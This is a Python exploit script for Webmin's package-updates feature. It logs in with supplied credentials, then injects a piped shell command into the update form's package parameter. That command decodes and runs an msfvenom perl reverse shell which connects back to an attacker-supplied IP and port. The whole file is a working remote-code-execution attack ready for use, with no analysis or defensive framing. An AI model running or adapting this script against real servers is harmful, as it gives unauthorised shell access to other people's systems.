import requests
import base64
import os
import urllib
import sys

requests.packages.urllib3.disable_warnings()

arglist = sys.argv
url = arglist[1]
cook = ""
username = arglist[2]
password = arglist[3]
lhost = arglist[4]
lport = arglist[5]

def main():
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"+
    "The syntax to run the program is: \n\n"+
    "python webmin.py <url> <username> <password> <your-ip> <your-port>\n\n"+
    "Example: python webmin.py https://10.10.14.14:10000 admin admin 10.10.11.11 4444")
    if "https://" in url:
        if "10000" in url:
            session_login()
            run_update()
        else:
            print("Please make sure the port is correct")
            exit()
    else:
        print("Please use https://")
        exit()



def session_login():
    global cook
    print("Trying to get the cookie sid")
    uri = url + "/session_login.cgi"
    payload = {'user': username , 'pass' : password}
    response = requests.post(uri, cookies={'testing': '1'}, data=payload, headers={'referer': url}, verify=False, allow_redirects=False)
    if str(response.status_code) == '302':
        cook = str(response.cookies).split(" ")[1].split("=")[1]
        print("Found cookies %s" %(cook))
    else:
        print("Oho something went wrong check your credentials\n")
        exit()
    return

def run_update():
    global cook
    uri = url + "/package-updates/update.cgi"
    ref = url + "/package-updates/?xnavigation=1"
    command = "msfvenom -p cmd/unix/reverse_perl LHOST="+lhost+" LPORT="+ lport
    #print(payload)
    shell = os.popen(command).readlines()
    payload = "u=acl%2Fapt&u=%20%7C%20"+urllib.quote("bash -c \"echo '"+ base64.b64encode(shell[0]) +"'| base64 -d | bash -i\"")+"&ok_top=Update+Selected+Packages"
    response = requests.post(uri, cookies={'testing': '1', 'redirect':'1', 'sid': cook }, data=payload, headers={'Referer': ref}, verify=False)
    print(response.status_code)
    return

if __name__== "__main__":
  main()
